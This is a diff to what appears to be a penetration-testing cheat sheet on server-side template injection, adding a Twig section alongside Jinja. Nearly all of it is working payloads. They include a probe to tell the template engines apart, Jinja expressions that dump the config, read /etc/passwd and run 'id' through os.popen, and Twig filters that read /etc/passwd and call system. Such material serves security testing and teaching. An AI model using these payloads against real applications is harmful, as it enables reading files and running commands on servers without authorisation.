@@ -61,7 +61,7 @@ ${{<%[%'"}}%\.
 
 I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Template else if the answer is this 49 is a Twig Template
 
-- Jinja Exploit (python)
+## Jinja Exploit (python)
 ```bash
 {{ config.items() }}
 {{ self.__init__.__globals__.__builtins__ }}
@@ -69,4 +69,13 @@ I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Templat
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 # RCE
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+# Twigo Exploit (php)
+```bash
+{{ _self }}
+# LFI
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+# RCE
+{{ ['id'] | filter('system') }}
 ```
